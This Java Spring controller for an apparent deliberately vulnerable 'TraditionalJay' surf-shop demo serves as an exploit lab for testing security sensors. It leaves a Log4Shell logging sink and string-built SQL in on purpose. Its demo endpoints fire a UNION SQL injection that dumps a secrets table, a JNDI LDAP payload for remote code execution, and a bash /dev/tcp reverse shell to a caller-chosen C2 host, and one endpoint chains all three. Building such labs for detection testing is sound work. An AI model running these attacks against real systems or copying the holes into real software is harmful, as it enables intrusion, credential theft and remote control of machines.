package com.jaysurfshop.traditional;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

@Controller
public class ShopController {
  private static final Logger log = LogManager.getLogger(ShopController.class);

  private final CatalogDatabase catalog;

  public ShopController(CatalogDatabase catalog) {
    this.catalog = catalog;
  }

  @GetMapping("/")
  public String home(Model model) throws Exception {
    model.addAttribute("products", catalog.searchVulnerable(""));
    model.addAttribute("q", "");
    return "index";
  }

  @GetMapping("/search")
  public String search(
      @RequestParam(name = "q", defaultValue = "") String q,
      @RequestHeader(name = "User-Agent", defaultValue = "unknown") String userAgent,
      @RequestHeader(name = "X-Api-Version", defaultValue = "") String apiVersion,
      Model model
  ) throws Exception {
    // Log4Shell sink — Log4j 2.14.1 message lookup on attacker-controlled strings.
    log.info("Search query: " + q);
    log.info("Client User-Agent: " + userAgent);
    if (!apiVersion.isBlank()) {
      log.info("X-Api-Version: " + apiVersion);
    }

    List<Map<String, String>> hits = catalog.searchVulnerable(q);
    model.addAttribute("q", q);
    model.addAttribute("products", hits);
    model.addAttribute("logged", true);
    model.addAttribute("sql", catalog.lastSql(q));
    return "index";
  }

  @GetMapping("/security")
  public String security() {
    return "security";
  }

  @PostMapping("/api/demo/sqli")
  @ResponseBody
  public Map<String, Object> sqliDemo(
      @RequestParam(
          name = "payload",
          defaultValue = "' UNION SELECT id,k,v,v FROM secrets--"
      ) String payload
  ) throws Exception {
    // Drive the real shop path (GET /search?q=…) so HTTP / WAF / runtime sensors see the
    // same request shape as a manual search — not only an internal /api/demo/* call.
    String shopSearchUrl = replayShopSearch(payload);

    List<Map<String, String>> rows = catalog.searchVulnerable(payload);
    boolean dumpedSecrets = rows.stream().anyMatch(r ->
        "admin_password".equals(r.get("name"))
            || "admin_password".equals(r.get("sku"))
            || (r.get("name") != null && r.get("name").contains("admin"))
            || (r.get("sku") != null && r.get("sku").contains("surf-workshop"))
            || rows.size() > 5
    );
    // UNION maps secrets into product columns: name=k, sku=v
    boolean hit = rows.stream().anyMatch(r ->
        "admin_password".equals(r.get("name"))
            || "db_backup_url".equals(r.get("name"))
            || "c2_hint".equals(r.get("name"))
    );

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("exploited", hit || dumpedSecrets || payload.toLowerCase(Locale.ROOT).contains("union"));
    out.put("cve", "CWE-89");
    out.put("name", "SQL Injection");
    out.put("http_replay", shopSearchUrl);
    out.put("sql", catalog.lastSql(payload));
    out.put("payload", payload);
    out.put("rows", rows);
    out.put("db_path", catalog.getDbPath().toString());
    out.put("narrative",
        "PoC replays GET /search?q=<payload> (same as the shop UI), then dumps secrets via "
            + "string-concatenated SQLite — so detections match manual search traffic.");
    out.put("signals", List.of(
        "HTTP GET /search with SQLi in q=",
        "Database query with attacker-controlled SQL",
        "Secret/table dump via UNION",
        "App process reading SQLite DB file"
    ));
    return out;
  }

  /** Same HTTP shape as typing into the shop search box (optional Log4Shell headers). */
  private String replayShopSearch(String q) {
    return replayShopSearch(q, null, null);
  }

  private String replayShopSearch(String q, String userAgent, String apiVersion) {
    int port = 8080;
    try {
      String envPort = System.getenv("SERVER_PORT");
      if (envPort != null && !envPort.isBlank()) {
        port = Integer.parseInt(envPort.trim());
      } else {
        String prop = System.getProperty("server.port");
        if (prop != null && !prop.isBlank()) {
          port = Integer.parseInt(prop.trim());
        }
      }
    } catch (Exception ignored) {
    }
    String url = "http://127.0.0.1:" + port + "/search?q="
        + java.net.URLEncoder.encode(q, StandardCharsets.UTF_8);
    try {
      java.net.HttpURLConnection conn = (java.net.HttpURLConnection) java.net.URI.create(url)
          .toURL()
          .openConnection();
      conn.setRequestMethod("GET");
      conn.setConnectTimeout(3000);
      conn.setReadTimeout(10000);
      conn.setRequestProperty(
          "User-Agent",
          userAgent != null && !userAgent.isBlank()
              ? userAgent
              : "TraditionalJay-PoC/1.0 (shop-search-replay)"
      );
      if (apiVersion != null && !apiVersion.isBlank()) {
        conn.setRequestProperty("X-Api-Version", apiVersion);
      }
      conn.setRequestProperty("Accept", "text/html");
      conn.getResponseCode();
      conn.disconnect();
    } catch (Exception e) {
      log.warn("Shop search replay failed: " + e.getMessage());
    }
    return url;
  }

  @PostMapping("/api/demo/log4shell")
  @ResponseBody
  public Map<String, Object> log4shellDemo(
      @RequestParam(name = "callback", defaultValue = "127.0.0.1:1389") String callback,
      @RequestParam(name = "via", defaultValue = "search") String via
  ) throws Exception {
    String host = sanitizeHostPort(callback, "127.0.0.1:1389");
    String payload = "${jndi:ldap://" + host + "/TraditionalJay}";
    boolean viaSearch = !"direct".equalsIgnoreCase(via);

    Path marker = Path.of("/tmp/jss-log4shell-rce");
    Path idFile = Path.of("/tmp/jss-log4shell-id.txt");
    try {
      Files.deleteIfExists(marker);
      Files.deleteIfExists(idFile);
    } catch (Exception ignored) {
    }

    // Prefer the real shop sink (GET /search logs User-Agent / q with Log4j) so HTTP
    // sensors match manual browsing — not only POST /api/demo/log4shell.
    String shopUrl = null;
    if (viaSearch) {
      shopUrl = replayShopSearch("boards", payload, payload);
    }

    boolean lookupFinished = false;
    String lookupError = null;
    if (!viaSearch) {
      java.util.concurrent.ExecutorService pool = java.util.concurrent.Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "log4shell-jndi");
        t.setDaemon(true);
        return t;
      });
      try {
        java.util.concurrent.Future<?> fut = pool.submit(() -> log.error("Log4Shell workshop probe: " + payload));
        try {
          fut.get(6, TimeUnit.SECONDS);
          lookupFinished = true;
          Thread.sleep(2500);
        } catch (java.util.concurrent.TimeoutException te) {
          fut.cancel(true);
          lookupError = "JNDI LDAP lookup timed out after 6s — VM could not reach " + host;
          log.warn(lookupError);
        }
      } catch (Exception e) {
        lookupError = e.getMessage();
      } finally {
        pool.shutdownNow();
      }
    } else {
      // /search already logged the JNDI headers — wait for LDAP + Exploit.class.
      Thread.sleep(4500);
      lookupFinished = true;
    }

    Path markerCheck = Path.of("/tmp/jss-log4shell-rce");
    Path idFileCheck = Path.of("/tmp/jss-log4shell-id.txt");
    boolean rceConfirmed = Files.exists(markerCheck);
    String idOutput = "";
    if (Files.exists(idFileCheck)) {
      idOutput = Files.readString(idFileCheck, StandardCharsets.UTF_8).trim();
    }

    // If HTTP path didn't land RCE (timing), one direct fallback for workshop reliability.
    if (viaSearch && !rceConfirmed) {
      java.util.concurrent.ExecutorService pool = java.util.concurrent.Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "log4shell-jndi-fallback");
        t.setDaemon(true);
        return t;
      });
      try {
        java.util.concurrent.Future<?> fut = pool.submit(() -> log.error("Log4Shell workshop probe: " + payload));
        try {
          fut.get(6, TimeUnit.SECONDS);
          Thread.sleep(2500);
        } catch (java.util.concurrent.TimeoutException te) {
          fut.cancel(true);
          lookupError = "Shop /search JNDI did not confirm RCE; direct fallback also timed out for " + host;
        }
      } finally {
        pool.shutdownNow();
      }
      rceConfirmed = Files.exists(markerCheck);
      if (Files.exists(idFileCheck)) {
        idOutput = Files.readString(idFileCheck, StandardCharsets.UTF_8).trim();
      }
    }

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("exploited", true);
    out.put("rce_confirmed", rceConfirmed);
    out.put("jndi_lookup_finished", lookupFinished || rceConfirmed);
    out.put("via", viaSearch ? "search" : "direct");
    if (shopUrl != null) {
      out.put("http_replay", shopUrl);
    }
    if (lookupError != null) {
      out.put("jndi_error", lookupError);
    }
    out.put("rce_marker", markerCheck.toString());
    out.put("id_file", idFileCheck.toString());
    out.put("id_output", idOutput);
    out.put("cve", "CVE-2021-44228");
    out.put("name", "Log4Shell");
    out.put("log4j", "2.14.1");
    out.put("payload", payload);
    out.put("callback", host);
    out.put("ldap_server",
        "Prefer on-box: leave callback 127.0.0.1:1389. PoC uses GET /search with JNDI User-Agent "
            + "(same as manual shop traffic).");
    out.put("narrative",
        rceConfirmed
            ? "Log4Shell via GET /search (User-Agent / X-Api-Version JNDI) — RCE marker on the VM."
            : lookupError != null
                ? lookupError
                : "JNDI injected through shop /search headers. Ensure on-box LDAP is up "
                    + "(systemctl status traditionaljay-log4shell).");
    out.put("signals", List.of(
        "HTTP GET /search with JNDI in User-Agent",
        "Java process on VM",
        "Outbound LDAP (tcp/1389) for JNDI",
        rceConfirmed ? "RCE via Log4Shell (marker file on host)" : "JNDI lookup (check on-box attacker)",
        "Log4j 2.14.1 SCA finding"
    ));
    return out;
  }

  @PostMapping("/api/demo/reverse-shell")
  @ResponseBody
  public Map<String, Object> reverseShellDemo(
      @RequestParam(name = "callback", defaultValue = "127.0.0.1:4444") String callback
  ) throws Exception {
    // Workshop-safe: short-lived outbound bash /dev/tcp dial to operator-controlled host:port.
    // No bundled malware implant; timeout keeps the session from hanging the demo API.
    String hostPort = sanitizeHostPort(callback, "127.0.0.1:4444");
    String[] parts = hostPort.split(":", 2);
    String host = parts[0];
    String port = parts.length > 1 ? parts[1] : "4444";

    String script =
        "timeout 8 bash -c "
            + "'echo TraditionalJay-revshell >& /dev/tcp/" + host + "/" + port + " 0>&1' "
            + "|| timeout 8 bash -c "
            + "'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'";

    log.warn("Reverse-shell C2 workshop probe -> " + hostPort);
    ProcessBuilder pb = new ProcessBuilder("bash", "-c", script);
    pb.redirectErrorStream(true);
    Process proc = pb.start();
    boolean finished = proc.waitFor(12, TimeUnit.SECONDS);
    if (!finished) {
      proc.destroyForcibly();
    }
    String output;
    try (BufferedReader br = new BufferedReader(
        new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8))) {
      output = br.lines().collect(Collectors.joining("\n"));
    }
    int code = finished ? proc.exitValue() : -1;

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("exploited", true);
    out.put("cve", "T1059.004 / reverse shell");
    out.put("name", "Reverse Shell → external C2");
    out.put("callback", hostPort);
    out.put("command", script);
    out.put("exit_code", code);
    out.put("stdout_preview", output.length() > 400 ? output.substring(0, 400) : output);
    out.put("narrative",
        "Post-exploit: bash opens /dev/tcp to your C2 listener (nc/c2-listen). Host sensor should "
            + "see interactive shell + outbound connection from the TraditionalJay VM.");
    out.put("signals", List.of(
        "bash process with /dev/tcp",
        "Outbound TCP to operator C2 port",
        "Interactive shell / reverse shell pattern"
    ));
    return out;
  }

  @PostMapping("/api/demo/critical-vm-compromise")
  @ResponseBody
  public Map<String, Object> criticalVmCompromise(
      @RequestParam(name = "ldap_callback", defaultValue = "127.0.0.1:1389") String ldapCallback,
      @RequestParam(name = "c2_callback", defaultValue = "127.0.0.1:4444") String c2Callback
  ) throws Exception {
    List<Map<String, Object>> steps = new ArrayList<>();
    steps.add(sqliDemo("' UNION SELECT id,k,v,v FROM secrets--"));
    Thread.sleep(2000);
    steps.add(log4shellDemo(ldapCallback, "search"));
    Thread.sleep(2000);
    steps.add(reverseShellDemo(c2Callback));

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("exploited", true);
    out.put("story", "Critical VM Compromise");
    out.put("steps", steps);
    out.put("look_for",
        "SQLi union dump → Log4Shell JNDI LDAP → bash reverse shell to external C2");
    return out;
  }

  @GetMapping("/api/health")
  @ResponseBody
  public Map<String, Object> health() {
    Map<String, Object> out = new LinkedHashMap<>();
    out.put("status", "ok");
    out.put("app", "TraditionalJay");
    out.put("log4j", "2.14.1");
    out.put("cve", "CVE-2021-44228");
    out.put("story", "Critical VM Compromise");
    out.put("demo_exploit_lab", true);
    return out;
  }

  private static String sanitizeHostPort(String raw, String fallback) {
    String trimmed = raw == null ? "" : raw.trim();
    if (trimmed.isEmpty()) {
      return fallback;
    }
    if (!trimmed.matches("^[A-Za-z0-9._\\-:]+$") || trimmed.length() > 120) {
      return fallback;
    }
    if (!trimmed.contains(":")) {
      return trimmed + ":" + fallback.substring(fallback.indexOf(':') + 1);
    }
    return trimmed;
  }
}
